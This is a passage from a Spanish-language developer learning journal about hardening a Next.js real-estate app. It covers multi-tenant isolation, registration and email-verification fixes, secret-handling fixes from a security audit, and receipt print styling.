### Por qué lo hice así y no de otra forma

**Por qué `additionalFields` y no Postgres RLS**: RLS sería el estándar dorado pero choca con connection pooling de Neon serverless (requiere `SET LOCAL` por transacción) y los errores que tira son opacos (`permission denied for table X`) en vez de errores TS legibles. Para este stack, la combinación de "session field + DB constraint NOT NULL + helpers + test E2E" da defense-in-depth real con errores debuggables. Si en V2 el código se vuelve más complejo, RLS queda como capa 5 disponible.

**Por qué hand-written SQL y no `db:push`**: `db:push` no genera archivo versionable, y no permite intercalar el `UPDATE` (backfill) entre `ADD COLUMN` y `SET NOT NULL`. Sin el archivo SQL en git, no había trail para reproducir la migración en prod. Una transacción atómica garantiza que o las 14 tablas migran juntas, o ninguna.

**Por qué errores 404 indistinguibles entre "no existe" y "es de otra agency"**: si distinguís ("no autorizado" vs "no encontrado"), un atacante puede enumerar IDs ajenos por probe — el 401/403 es un side-channel que confirma "este UUID existe en otra agency". El 404 cierra ese leak.

**Por qué fases aditivas (1-3) antes del cutover (4)**: cada una es mergeable y reversible por separado. Si interrumpe algo a la mitad, la app sigue funcionando porque las fases 1-3 no cambian comportamiento — solo agregan capacidad. La fase 4 es la única que sí altera el comportamiento de las routes, y se hizo en 8 sub-commits revisables por dominio, todos sumando al mismo branch.

**Por qué subagentes para el cutover**: cada task de Fase 4 es mecánica (aplicar el mismo patrón a N archivos) pero el contexto se contamina rápido si lo hacés en serie. Un subagente fresh por dominio tiene contexto limpio, aplica el patrón uniforme, reporta concerns puntuales. Verifiqué cada commit antes de avanzar.

**Por qué el script de validación E2E y no un test unitario por route**: un test unitario falla solo si el patrón se aplicó mal en una route específica — pero el patrón se aplicó por subagent, y cada subagent verificó compile-clean por archivo. El bug que captura un E2E es "alguien rompe la cadena entre helpers y rutas en una etapa futura". Para eso, el script funciona como guard rail: lo corrés cuando agregues una route nueva, te dice si rompiste el aislamiento.

**Por qué borré 2 scripts en lugar de actualizarlos**: `fix-and-generate.ts` y `check-and-generate-ledger.ts` eran one-off / diagnóstico de eventos pasados. Ambos referenciaban tablas o flujos que ya no existen (uno tenía early-exit `if count > 0 process.exit(0)`, otro queryeaba `contract_tenant` que fue renombrada). No eran "código a mantener", eran archivos artefacto. Los borré con commit explícito por si en el futuro querés recuperarlos.

### Conceptos que aparecieron

- **Defense-in-depth**: principio de "varias capas que fallan cerradas independientemente". Si una capa se rompe, las otras te salvan. Para multi-tenancy: sesión + DB constraint + helpers + test = 4 capas. Si un dev nuevo se olvida del helper, el constraint NOT NULL del insert lo atrapa. Si el constraint se rompe, el helper en el SELECT lo atrapa. Si ambos fallan, el test E2E lo marca.

- **Multi-tenancy "real" vs implícito**: implícito = "todos los datos pertenecen al user logueado por convención". Real = "cada row tiene un `agencyId` y todas las queries lo filtran". El primero funciona hasta que agregás un segundo tenant; el segundo escala sin sorpresas.

- **`AsyncLocalStorage` y `next/headers`**: por qué Next.js puede saber "qué request está procesando ahora" en una función async sin pasar `request` como parámetro. Useful para entender por qué `auth.api.getSession({ headers: await headers() })` funciona sin parámetros explícitos en cada route.

- **Cookies HMAC-firmadas (Better Auth)**: por qué el token de sesión no es solo el value de `session.token` en la DB — Better Auth firma el cookie con `BETTER_AUTH_SECRET` para que un atacante no pueda forjar un token. En el script E2E, usé `auth.api.signInEmail` para que Better Auth me devuelva el cookie firmado correctamente (no traté de armarlo a mano).

- **Neon branches efímeras**: forks de la DB que comparten storage hasta que divergen. Permite tener una "DB de test" identica a la real, hacerle cualquier cosa, y descartarla en segundos. Sin esto, validar SEC-3 requería montar Postgres en docker o duplicar manualmente — no escalable.

- **Side-channel attacks via status codes**: 401 vs 403 vs 404 leakean info distinta. 401 dice "no estás autenticado". 403 dice "estás autenticado pero no autorizado a este recurso (que existe)". 404 dice "no existe O no está disponible para vos". El 404 es el más inocuo — no le dice al atacante si el recurso existe.

- **"Hijas de hijas" y por qué no llevan `agencyId`**: tablas como `task_history`, `receipt_allocation`, `contract_clause` son hijas de tablas que sí están scoped. Agregar `agencyId` a estas sería 1 nivel de redundancia (ya está en el padre directo). El precio de la redundancia es coordinación: si insertás una `task_history` con un `agencyId` distinto al de su `task`, los datos se desincronizan. Mejor: validar el padre y dejar que el FK chain garantice el aislamiento.

- **Per-agency sequence vs global sequence**: el cambio en `nextReciboNumero` (recibo `REC-0001` reinicia por agency) es un fix de correctitud que SEC-3 forzó. Antes, dos agencies con el mismo número de recibo eran posibles si el contador era global → conflicto en `receiptAnnulment` que joinea por `reciboNumero`. Ahora cada agency tiene su propia secuencia.

### Preguntas para reflexionar

1. La regla "cada commit del cutover compila clean" funciona porque la columna agencyId fue agregada a las tablas (Fase 1) ANTES de que las routes la requieran (Fase 4). ¿Qué hubiera pasado si lo hacíamos al revés (routes primero, schema después)? ¿Por qué ese orden evita un período de "build roto"?

2. Eliminé 2 scripts que estaban "ya ejecutados" (fix-and-generate, check-and-generate-ledger). ¿Cómo distingo "código de un solo uso" de "código de mantenimiento que parece muerto"? Si en el futuro encuentro un script así, ¿qué señales me hacen confiar en que se puede borrar?

3. El test E2E hace 32 asserciones (16 por dirección × 2). Hay ~91 routes en total, pero solo 13 están en CROSS_CHECKS y 3 en LIST_CHECKS. ¿Es suficiente cobertura, o debería ampliar? ¿Qué porcentaje de cobertura es "suficiente" cuando el patrón es uniforme?

4. La posible vulnerabilidad que detectó el implementer de T4.6 (FK target leak: insertar un `servicio` con `agencyId=mine` apuntando a `propertyId=ajeno`) la fixeé solo en services. ¿Cómo decido si vale el costo de auditar las otras ~85 routes para ese mismo vector? ¿Hay forma de hacerlo automático (lint rule, schema constraint cross-agency)?

5. Better Auth's `additionalFields` propaga `agencyId` con la sesión, pero la sesión queda stale si el `agencyId` del user cambia. Hoy no aplica (1 user = 1 agency). En V2 con invitaciones de colaboradores, ¿qué problema concreto introduce esto? ¿Cómo lo resolvés sin forzar logout?

### Qué debería anotar en Obsidian

- [ ] Concepto: Defense-in-depth en multi-tenancy (sesión + constraint + helper + test)
- [ ] Concepto: Postgres RLS — qué es, cuándo usarlo, por qué lo descarté para Neon serverless
- [ ] Concepto: `AsyncLocalStorage` y cómo Next.js mantiene contexto request-scoped
- [ ] Concepto: Side-channel attacks via HTTP status codes (404 indistinguible)
- [ ] Patrón: schema-first migration — agregar columna nullable → backfill → SET NOT NULL → FK, todo en una transacción
- [ ] Patrón: Better Auth `additionalFields` para propagar tenant info en la sesión
- [ ] Patrón: subagent-driven cutover de N archivos con pattern uniforme
- [ ] Patrón: validación E2E con Neon ephemeral branch
- [ ] Decisión técnica: SEC-3 multi-tenancy — 4 capas vs RLS, fases aditivas vs PR atómico, 14 tablas vs todas
- [ ] Bug: `LIMIT 1` sin `ORDER BY` → no determinístico (señalado en code review de T1.1, no fixeé porque hay 1 sola agency)
- [ ] Comando: `mcp__neon__create_branch` + `delete_branch` para tests aislados
- [ ] Comando: levantar `bun dev` con env var override (`DATABASE_URL=...`)

---

## 2026-05-06 — SEC-2 (registro + verificación de email)

### Qué hice
Cerrado el segundo bloqueante de la auditoría: el flujo de registro otorgaba `account_admin` + `emailVerified: true` directo desde un endpoint público, lo que convertía a cualquiera en admin instantáneo. Cuatro archivos:

1. **`src/app/api/register/route.ts`**: el insert ahora pone `role: "visitor"` y `emailVerified: false`. Después del commit del transaction, llama `auth.api.sendVerificationEmail({ body: { email, callbackURL: "/login" } })` — el endpoint nativo de Better Auth que genera el token, lo persiste en `verification`, y dispara el callback `sendVerificationEmail` configurado en `auth/index.ts` (que a su vez usa nuestro `sendEmail` con nodemailer + Gmail). Si el envío falla, borro el user (cascade borra el account) para que el usuario pueda reintentar sin chocarse con "email ya registrado".

2. **`src/lib/auth/index.ts`**: `requireEmailVerification: false` → `true`. Ahora Better Auth refuses sign-in si el user no verificó.

3. **`src/proxy.ts`**: descomenté el bloque que redirige a `/verify-email` si la sesión no tiene `emailVerified`. Le pasé `?email=X` para que el form de reenvío venga prefilled.

4. **`src/app/(dashboard)/layout.tsx`**: lo convertí en `async` y agregué un check — si el user logueado no tiene agency en `agency.ownerId = user.id`, redirige a `/register-oauth`. Esa página es la que pide el nombre de inmobiliaria y promueve el rol a `account_admin` en transacción atómica con la creación de la agency.

El resultado: el flujo email/password ahora es simétrico al OAuth. Empezás como `visitor` sin verificar → recibís email → verificás → logueás → si no tenés agency te mandan a `/register-oauth` → creás la agency y te promueven a admin. Antes el email/password cortocircuitaba todos los pasos.

Anoté 5 deudas técnicas que quedaron del fix en `PENDIENTES.md` bajo prioridad baja (rename de `/register-oauth`, schema default `account_admin`, UX del verify-email, perf del layout, idempotencia del role-promotion).

### Por qué lo hice así y no de otra forma
**Por qué reusé `/register-oauth` para los dos flujos en vez de hacer una página nueva**: la lógica que necesita el flujo email/password después de verificar email es exactamente la misma que el OAuth — pedir nombre de inmobiliaria, crear `agency`, promover a `account_admin`. La página y la ruta API ya hacían eso. Hacer una página separada hubiera sido duplicación. El nombre `register-oauth` queda incorrecto, pero renombrar es scope creep — lo dejé como deuda chica.

**Por qué `auth.api.sendVerificationEmail()` y no `createEmailVerificationToken()` manual**: el segundo es la primitiva (genera el token, lo persiste). El primero hace eso + dispara el callback configurado + arma la URL final. Como el callback ya está configurado en `auth/index.ts` con el HTML del email, llamar al endpoint de alto nivel reusa todo eso gratis. Si hubiera ido por la primitiva tendría que reimplementar la URL builder y el llamado a `sendEmail`, y duplicar la plantilla.

**Por qué borrar el user si falla el envío del email**: la alternativa es dejar al user creado y que use el form de "reenviar verificación". Pero si falla la primera vez, probablemente fallaba la segunda igual (Gmail caído, network, etc.). Mientras tanto el user queda inconsistente: registrado pero sin posibilidad de verificar, y si intenta registrarse de vuelta le sale "email ya registrado". Mejor borrar y que vea el error claro inmediatamente.

**Por qué el chequeo de agency en el layout y no en el proxy**: el proxy corre en TODOS los requests del matcher (incluso assets si no estuvieran excluidos). Hacer una query de agency ahí sería caro. El layout corre solo en server components del dashboard, una vez por navegación. Mismo efecto, fracción del costo. La contra es que si el user navega vía cliente sin re-renderizar el layout, el check no corre — pero Next.js App Router rerenderiza el layout en navegaciones server-side, así que el path real está cubierto.

**Por qué no migré el schema default `user.role` de `"account_admin"` a `"visitor"`**: requiere `db:push` y la decisión técnica del proyecto fue tratar `db:migrate` como roto y usar `db:push` solo en dev. Mover el default ahora puede pasar inadvertido al deploy si no se replica en prod. Lo dejé como deuda explícita para hacer junto con la migración grande de SEC-3 (donde hay otras columnas a tocar).

### Conceptos que aparecieron
- **`async` en Next.js layouts**: los layouts de App Router pueden ser `async function` y hacer queries DB / `getSession` / `headers()` antes de renderizar. Es lo que permite el "guard" del agency check sin tener que bouncear al cliente. Servir-side, sin flash, redirigible vía `redirect()` de `next/navigation`.
- **`redirect()` de `next/navigation` desde server components**: tira una excepción especial que Next.js cazza y convierte en HTTP 307. No retorna nada — la ejecución se corta ahí. Por eso no hace falta `return` después.
- **Cascade delete en SQL**: cuando defino una FK con `onDelete: "cascade"` (como `account.userId → user.id`), borrar la fila padre borra automáticamente las hijas. Es lo que me permite hacer `db.delete(user)` y el `account` asociado desaparece solo, sin tener que escribir un transaction explícito.
- **Better Auth's `auth.api`**: los endpoints HTTP de Better Auth se exponen en `/api/auth/*`, pero también están disponibles como llamadas TypeScript en `auth.api.*`. Esto permite invocarlos desde server code sin pasar por la red. El shape es `{ body, headers? }` para imitar un request.
- **Simetría entre flows de auth como principio de diseño**: los dos paths (email/password y OAuth) tenían un destino común (un `account_admin` con su agency creada) pero llegaban por caminos asimétricos. Hacer que converjan en `/register-oauth` cierra agujeros (no hay manera de saltarse el paso de "crear agency") y baja la superficie de testeo (un solo flow de promoción a auditar). Cuando dos paths llevan al mismo estado final, es señal de que pueden converger antes.
- **Deuda técnica honesta**: no todo lo que descubrís durante un fix se arregla en el mismo commit. Las 5 deudas que anoté no son procrastinación — son cambios que tienen su propio scope (rename de URL = todo un sweep, schema default = migración) y meterlos en SEC-2 lo hubiera convertido en un PR gigante difícil de revisar. Pequeño y atómico > grande y "completo".

### Preguntas para reflexionar
1. La `dashboard/layout.tsx` ahora hace 2 queries por navegación (`getSession` + agency check). Better Auth tiene un cookie cache que está deshabilitado adrede ("para evitar problemas después del logout"). ¿Cuál es el costo real de mantener cookie cache habilitado con TTL corto (ej. 60s)? ¿Vale el trade entre "session siempre fresca" y "logout instantáneo"?
2. El check de agency en el layout funciona porque el layout corre server-side. Pero si en el futuro algún componente cliente hace fetches directos sin recargar el layout (ej. un dialog que abre `/api/properties`), ese check no se evalúa. ¿Eso es un problema? La respuesta corta es "no, porque las APIs tienen sus propios checks de auth y rol". ¿Cuándo deja de ser cierto eso?
3. Hice que el flujo de `register/route.ts` borre al user si falla el envío del email. Pero `auth.api.sendVerificationEmail` ya creó la fila en la tabla `verification`. ¿Esa fila queda huérfana al borrar el user? Si el user reintenta registrarse 5 minutos después, ¿esa fila stale puede generar conflicto?
4. Better Auth tiene `auth.api.sendVerificationEmail` que parece pensado para ser llamado por usuarios autenticados que quieren reenviarse el email. Lo estoy llamando desde un endpoint público con un user recién creado y sin sesión. ¿Hay algún check interno de Better Auth que pueda hacerlo fallar en un caso raro? Lo confirmé funcionalmente leyendo el callback en `auth/index.ts`, pero un test E2E no estaría de más.

### Qué debería anotar en Obsidian
- [ ] Concepto: `async` server components en Next.js 16 — qué pueden hacer y dónde correrlos vs cliente
- [ ] Concepto: `redirect()` de `next/navigation` — cómo funciona la excepción especial bajo el capó
- [ ] Concepto: cascade delete en FKs y cuándo usarlo (vs explicit transaction delete)
- [ ] Patrón: simetría entre flows de auth como principio de diseño — convergencia en un único punto de creación de estado
- [ ] Patrón: `auth.api.*` para llamar a endpoints de Better Auth desde server code sin pasar por HTTP
- [ ] Patrón: rollback manual cuando la operación cruza el borde de un transaction (envío de email post-commit)
- [ ] Decisión técnica: SEC-2 — por qué reusar `/register-oauth` para email/password en vez de duplicar
- [ ] Decisión técnica: agency check en layout vs proxy — costo por request
- [ ] Bug: endpoint de registro que insertaba `account_admin + emailVerified: true` directo, saltando Better Auth
- [ ] Práctica: anotar deuda técnica explícita en vez de arrastrarla en el mismo commit

---

## 2026-05-06 — Auditoría de seguridad pre-deploy + SEC-1 (secrets obligatorios)

### Qué hice
Antes de subir el proyecto a producción corrí una auditoría de seguridad sobre todo el código. El agente identificó 10 candidatos; verifiqué cada uno leyendo el código citado y filtré 2 falsos positivos (path traversal en uploads — Next.js no permite `..` en segmentos dinámicos; PATCH `/api/agency` sin chequeo de rol — solo afecta la propia agencia del usuario). Quedaron **4 HIGH y 4 MEDIUM** reales, todos bloqueantes para deploy. Los volqué como sección nueva `🚨 Bloqueante para producción` arriba de todo en `PENDIENTES.md`, agrupados en 7 ítems (junté los que son el mismo trabajo).

Después arranqué con SEC-1 (el más barato, ~5 min). Dos archivos:

1. **`src/lib/auth/index.ts`**: el secreto que firma las cookies de sesión caía a `"change-me-in-production"` si la env var `BETTER_AUTH_SECRET` faltaba. Ese string está commiteado en el repo, o sea es público. Fix: guard al tope del módulo que tira `Error` si falta. La app ya no arranca sin secreto.

2. **`src/app/api/cron/cleanup-files/route.ts`**: la ruta hacía `if (CRON_SECRET) { check }` — si la env var faltaba, saltaba el chequeo entero y la ruta quedaba abierta a cualquiera en internet. Fix: invertí la lógica — devuelve 503 si falta el secreto, 401 si no coincide. Cerrada siempre.

### Por qué lo hice así y no de otra forma
**Por qué `throw` y no warning + fallback a otro valor**: el fallback `|| "change-me-in-production"` era exactamente el bug — un valor "por defecto" que hace que la app *parezca* funcionar pero con un secreto público. Cualquier mitigación que mantenga el fallback (loguear warning, usar un secreto generado al boot, etc.) sigue siendo "puerta abierta". La única opción honesta es que la app no arranque. Es preferible un error claro al deployar que un hueco silencioso.

**Por qué `throw` para uno y `return 503` para el otro**: depende del scope del recurso. `BETTER_AUTH_SECRET` es transversal a toda la app — sin él, ni un solo request puede ser autenticado correctamente. Tirar al boot es lo correcto: si la app no puede hacer auth, no debería ofrecer ninguna ruta. `CRON_SECRET` es solo para una ruta específica (cleanup); si falta, la ruta no debería funcionar pero el resto del sistema sí. Por eso la ruta del cron devuelve 503 ("no disponible") en vez de derribar todo.

**Por qué no junté los dos secretos en un solo archivo de validación**: tentador hacer `src/lib/env.ts` con todas las validaciones centralizadas, pero hoy son solo dos. Si crece a 5+ vale la pena la abstracción; con 2 es overengineering. El `throw` al tope del archivo que usa el secreto es más localizado — quien lee `src/lib/auth/index.ts` ve la regla ahí mismo.

### Conceptos que aparecieron
- **Fail-fast vs fail-closed**: dos formas distintas de "fallar bien". Fail-fast = la app no arranca si la config crítica falta (preferible para todo lo transversal: secrets de auth, conexión a DB, etc.). Fail-closed = el recurso afectado devuelve error pero el resto sigue (preferible para features opcionales: cron jobs, integraciones específicas). La regla general es: nunca fallar abierto — ante una config faltante, jamás debe quedar más permisivo de lo normal.
- **Narrowing por `throw`/`asserts`**: cuando hacés `if (!x) throw ...`, TypeScript "sabe" que después de esa línea `x` no puede ser `undefined`. Por eso después podés usar `x` como si fuera `string` aunque arriba era `string | undefined`. Es lo que permite que el `secret,` de la línea siguiente compile sin un `!` ni un `?? throw`.
- **"Llave debajo del felpudo"** como antipatrón: dejar un default público para que algo "no falle por las dudas" es la firma de seguridad más común que sale mal. El default termina siendo el caso real (porque la gente se olvida de setear la env var), y el "por las dudas" se convierte en "siempre". Si el comportamiento por defecto es inseguro, el código debe rechazarse a sí mismo, no aceptarse con un default.
- **Auditoría con sub-agente vs revisión propia**: el flujo fue: agente identificador (lee código y lista candidatos) → yo verifico cada cita leyendo los archivos → filtro falsos positivos. Importante: el agente acertó 8 de 10, pero los 2 errores eran sutiles (path traversal en Next.js, scope del PATCH /agency). Sin la verificación humana hubiera quedado ruido en el reporte. La regla: nunca confiar la conclusión final al agente, sí la búsqueda inicial.

### Preguntas para reflexionar
1. El bug de la "llave debajo del felpudo" aparece muy seguido en código. ¿Por qué los developers lo escriben? ¿Es por miedo a que la app crashee en dev? ¿Por costumbre de poner defaults a todo? Si pudieras meter una regla de lint que detectara `process.env.X || "..."` cuando `X` es un secret, ¿cómo distinguirías "secret" de "config benigna" automáticamente?
2. La diferencia entre fail-fast y fail-closed la determiné por "qué tan crítico es el recurso". Pero "crítico" es subjetivo. ¿Hay alguna otra heurística más concreta? Por ejemplo: ¿"si falta esta env var, ¿hay alguna ruta que aún tenga sentido servir?"? Si sí → fail-closed por ruta. Si no → fail-fast.
3. La auditoría detectó que `register/route.ts` bypassea Better Auth y mete `role: "account_admin"` directo. ¿Por qué existe este bypass? Si Better Auth ya implementa registro, ¿qué necesidad había de duplicar la lógica? ¿Es una decisión técnica vieja que quedó? (esto lo voy a investigar al hacer SEC-2)

### Qué debería anotar en Obsidian
- [ ] Concepto: fail-fast vs fail-closed — cuándo usar cada uno
- [ ] Concepto: TypeScript narrowing por `throw` (también por `asserts` y `never`)
- [ ] Patrón: validar env vars secretas al boot del módulo en vez de en runtime con fallback
- [ ] Patrón: sub-agente identificador + verificación humana de cada cita = auditoría confiable
- [ ] Bug: `|| "default-value"` en secrets como antipatrón — el default se vuelve el caso real
- [ ] Decisión técnica: SEC-1 — por qué `BETTER_AUTH_SECRET` tira al boot (transversal) vs `CRON_SECRET` que devuelve 503 (route-specific)

---

## 2026-05-06 — Comprobante de liquidación + sistema visual + critique del LedgerTable

### Qué hice
Sesión larga, tres bloques.

**Bloque 1 — Feature "Comprobante de liquidación al propietario"**: brainstorm + spec + plan + ejecución por subagentes + final review. Página `/comprobantes/[id]` espejada de `/recibos/[id]`, con título dinámico según modalidad ("COMPROBANTE DE LIQUIDACIÓN" en A, "CONSTANCIA DE COBRO DISTRIBUIDO" en split), tabla con bruto/comisión/neto por concepto, sello "ANULADO" diagonal, modal de envío por email. Refactor: `computeNetAndCommission` extraída a `src/lib/owners/commission.ts` para reuso. API GET + POST send. Conexión desde el menú `···` de la CC propietario via un nuevo campo `cashMovementId` (que descubrió un bug: yo asumía `cash_movement.ledgerEntryId` poblado, pero `receipts/emit` nunca lo setea — lookup correcto va por `reciboNumero`).

**Bloque 2 — Sistema visual con `/impeccable`**: corrí `teach` (que detectó que `PRODUCT.md` ya existía) y después `document` → escribió `DESIGN.md` (formato Stitch, 6 secciones, frontmatter con tokens) y `DESIGN.json` (sidecar con tonal ramps, shadows, motion, breakpoints, snippets HTML/CSS de 9 componentes). Documenté el sub-sistema "Paper Surface" como capa visual independiente del dark UI. Creé los tokens `--paper-bg/text/muted/border/mono` y `--destino-owner/-agency`.

**Bloque 3 — Quality passes**: `audit` del comprobante (12/20 → 19/20) → `harden` (Dialog semántico, h1 sr-only, ANULADO con aria-label, tabla con caption+scope) → `polish` (todos los `<button>` a shadcn `<Button>`) → `adapt` (touch targets 44px en mobile). Después `critique` del LedgerTable (17/40 → 27/40) → 5 fixes quirúrgicos: invertir mora dimming, tokenizar destino badges, distill celda Concepto, tooltips + glosario en estados, kebab solo con destructivos + comprobante como icono.

23 commits en total. Feature completa, dos páginas (recibo + comprobante) alineadas con el sistema, ledger sustancialmente más legible.

### Por qué lo hice así y no de otra forma
**Sobre `@media print` para PDFs**: cuando la audit subió el tema de "¿no sería más serio puppeteer/react-pdf?", la respuesta honesta es: el PDF que genera el navegador desde `Save as PDF` es byte-equivalente al de puppeteer. Lo único que NO se puede con `@media print` es adjuntar PDFs al email — y el sistema ya manda links, no adjuntos. Sumar puppeteer es +100MB de Chromium para una mejora marginal. Quedó en PENDIENTES baja prioridad.

**Sobre "shadcn-first" como regla**: el comprobante había nacido espejando al recibo, que era hand-rolled. Cuando escribí `DESIGN.md` puse "Don't hand-roll a button when `<Button variant="...">` exists" y eso convirtió en deuda lo que antes era pattern. La migración a shadcn `<Button>`/`<Dialog>` no fue purismo — fue cumplir la regla que el propio proyecto se acababa de poner.

**Sobre la mora dimming invertida**: el critique encontró que `opacity-60` en períodos pasados hacía que un cargo impago de hace 2 meses (lo que Marina busca a las 11pm) fuera MÁS callado que un cargo proyectado del mes actual a opacidad completa. La opacidad estaba siendo "distancia temporal" cuando para items impagos la distancia temporal e *importancia* están inversamente correlacionadas. Pasado + pendiente = urgente. La solución fue mover la dimming de período-container a per-row state-based (paid → opacity-60, future → opacity-50, overdue → bg-destructive/5).

**Sobre el sub-sistema "Paper Surface"**: las paletas dark UI (oklch warm-tinted) y paper (cream cálido) son contradictorias por diseño. El comprobante simula papel impreso; usar el dark UI ahí sería romper la metáfora. Tokenizar como sub-sistema explícito (`--paper-*`) deja claro que son dos sistemas que NO se mezclan en la misma superficie, y centraliza el lugar a editar si querés cambiar el "tono del papel" en todo el sistema (recibo + comprobante + signature pad + live preview de la admin).

**Sobre el critique vs audit**: corrí audit primero porque chequea cosas medibles (contraste, ARIA, performance) y critique después porque chequea cosas subjetivas (jerarquía, claridad, AI slop). Hacerlo al revés llevaría a discutir aesthetics sin haber arreglado bugs medibles primero.

### Conceptos que aparecieron
- **OKLCH**: espacio de color perceptualmente uniforme. `oklch(L C H)` = lightness 0-1, chroma (saturación) 0+, hue 0-360. La gracia: dos colores con misma `L` se ven igual de claros/oscuros independientemente del hue. El proyecto usa OKLCH para dark mode porque mantiene la sensación de "mismo brillo" cuando varía el hue.
- **Sub-sistema visual**: cuando dos contextos tienen reglas contradictorias (papel = cálido claro / UI = dark warm), conviene tokenizarlos por separado en vez de extender el sistema principal. El `--paper-*` group existe en `:root` y NO se redefine en `.dark` porque no tiene contexto theme — el papel siempre es cream.
- **Side-stripe borders como anti-pattern**: `border-left` o `border-right` >1px en color saturado es uno de los bans absolutos de impeccable. Razón: lee como "alarma genérica" sin información, y los frameworks de design tokens nunca tienen una semántica para "color stripe edge". Reemplazables por: full-border tinted, top-stripe, leading icon, o nada.
- **shadcn `<Dialog>` vs modal hand-rolled**: el modal hecho a mano carecía de `role="dialog"`, focus trap, Escape handler. La migración a `<Dialog>` fue una sola pieza grande pero gana esos 3 atributos gratis (Radix lo implementa).
- **Subagent-driven development**: cada task se delega a un subagente fresco con prompt autocontenido (sin asumir contexto previo), seguido de un spec reviewer (¿hizo lo que el plan pedía?) y un code quality reviewer (¿está bien hecho?). Evita que el coordinator se contamine de detalles de implementación.
- **Restrained color strategy**: terracota primario usado en ≤10% de cualquier viewport. La rareza ES el significado. Si dos cosas terracota gritan a la vez, la jerarquía se rompió.
- **WCAG 2.5.5 Target Size**: 44×44px mínimo en touch devices. La forma correcta de fixearlo manteniendo el size compacto en desktop: `min-h-11 sm:min-h-0` (mobile fuerza 44px, ≥640px revierte al `h-8` del Button size="sm").
- **`role="img"` + `aria-label` en sellos visuales**: el sello "ANULADO" es una marca con significado, no decoración. Lectores de pantalla lo anuncian si tiene `role="img" aria-label="..."`. Sin eso, leen el comprobante completo creyendo que es válido.
- **Tonal layering vs shadow-based depth**: el dark UI del proyecto usa 4 niveles de surface (bg → surface-mid → surface → surface-high) y NO usa box-shadow. La superficie "sube" porque su tonalidad es un paso más clara que la de atrás. Las sombras se reservan para el papel impreso (recibos/comprobantes).
- **Tooltip + Popover para documentación in-context**: en vez de un menú "Help" separado, cada Badge de estado lleva su definición en Tooltip (hover/focus) + un botón `?` en el header de la columna abre un Popover con el glosario completo. Cero navegación, cero "buscá la documentación".

### Preguntas para reflexionar
1. ¿Por qué `isOwnerView` referenciado 11 veces es una bandera roja arquitectónica? ¿En qué punto un boolean prop deja de ser "configuración" y empieza a ser "componente fingiendo ser dos componentes"?
2. ¿Cuándo conviene un sub-sistema visual como "The Paper Surface" vs extender el sistema principal? Si mañana hubiera una página de "modo presentación" para mostrar datos a un cliente en proyector, ¿también ameritaría sub-sistema o sería abuso del concepto?
3. La critique encontró que la mora dimming era el bug más grande del LedgerTable. ¿Por qué la opacidad fue tan engañosa como cue visual? ¿Qué hace que un cue funcione "bien" o "mal" para comunicar urgencia?
4. El `cash_movement.ledgerEntryId` siempre nullable (incluso para movimientos automáticos) fue un bug latente que descubrí cuando intenté usarlo como join key. ¿Por qué los campos "opcionales por diseño" pueden esconder bugs así, y cómo se evita?

### Qué debería anotar en Obsidian
- [ ] Concepto: OKLCH y por qué se prefiere sobre HSL/sRGB para sistemas con dark mode
- [ ] Concepto: sub-sistema visual (paper surface) y cuándo amerita tokenización separada
- [ ] Concepto: tonal layering vs shadow-based depth como dos formas de comunicar profundidad
- [ ] Patrón: Tooltip + Popover para documentación in-context (sin página de help)
- [ ] Patrón: `min-h-11 sm:min-h-0` para touch targets 44px en mobile sin perder densidad en desktop
- [ ] Decisión técnica: por qué `@media print` es válido vs puppeteer/react-pdf
- [ ] Decisión técnica: subagent-driven development con dos reviewers (spec + code quality)
- [ ] Bug: opacidad como cue de "distancia temporal" estaba inversamente correlacionada con urgencia
- [ ] Bug: campos nullable por diseño que la app real nunca puebla (cash_movement.ledgerEntryId)
- [ ] Comando: `/impeccable teach` + `document` para escribir DESIGN.md desde código existente
- [ ] Comando: `/impeccable audit` (técnico) vs `/impeccable critique` (subjetivo) — cuál corre primero
- [ ] Patrón: side-stripe borders como anti-pattern y sus alternativas (top-stripe, full border, leading icon)

---

## 2026-05-06 — PDF del recibo

### Qué hice
Implementé los estilos de impresión del recibo de inquilinos. El botón "Imprimir recibo" ya existía y llamaba a `window.print()`. La mejora fue asegurar que al imprimir, el resultado sea limpio: sin sidebar, sin header de navegación, fondo blanco, tamaño A4 con márgenes correctos.

Cambios:
- `globals.css`: bloque `@media print` con `@page { size: A4; margin: 1.5cm }`, fondo blanco, `print-color-adjust: exact`
- `dashboard-layout.tsx`: `print:hidden` en `AppSidebar` y en el `<header>` con breadcrumbs
- `recibos/[id]/page.tsx`: `print:bg-white` en el div raíz y `print:!bg-white` en el card del recibo

### Por qué lo hice así y no de otra forma
Se evaluó agregar `@react-pdf/renderer` para generar un PDF descargable, pero al explorar el flujo real del negocio quedó claro que el caso de uso es imprimir o enviar por email. Guardar como archivo nunca era el objetivo. La solución con `@media print` no agrega ninguna dependencia nueva, reutiliza el HTML que ya existía, y el navegador hace el trabajo de renderizado.

El `print:!bg-white` (con `!`) fue necesario porque el card del recibo tiene un `background` en inline style. Los estilos inline tienen mayor prioridad que las clases CSS, así que la única forma de pisar eso desde un archivo de estilos es usar `!important`.

### Conceptos que aparecieron
- **`@media print`**: un bloque CSS que solo aplica cuando el usuario manda a imprimir la página. El navegador lo activa automáticamente al ejecutar `window.print()`.
- **`@page`**: regla CSS especial para configurar el papel: tamaño, márgenes, orientación. Solo existe dentro de `@media print`.
- **`print-color-adjust: exact`**: por defecto los navegadores eliminan fondos de color al imprimir para ahorrar tinta. Esta propiedad le dice "imprimí los colores tal cual están en pantalla".
- **`!important` en CSS**: fuerza que una regla se aplique por encima de otras con mayor especificidad, incluyendo inline styles. En Tailwind v4 se escribe con el prefijo `!` antes de la clase: `print:!bg-white`.
- **Especificidad CSS**: jerarquía que decide qué regla gana cuando dos reglas apuntan al mismo elemento. De menor a mayor: reglas de hoja de estilos → clases → IDs → inline styles → `!important`.

### Preguntas para reflexionar
1. ¿Por qué los inline styles tienen mayor prioridad que las clases CSS? ¿Es una decisión de diseño del lenguaje o una limitación?
2. Si en el futuro necesitás descargar el PDF como archivo (para adjuntar a un email desde el sistema), ¿qué librería usarías y dónde viviría la lógica: en el cliente o en el servidor?

### Qué debería anotar en Obsidian
- [ ] Concepto: `@media print` y `@page` — cómo controlar la impresión desde CSS
- [ ] Concepto: especificidad CSS y cuándo usar `!important`
- [ ] Decisión técnica: por qué elegí `window.print()` sobre una librería de PDF para el recibo

---

## 2026-05-05 — Modalidad de pago dividido (split payment)

### Qué hice
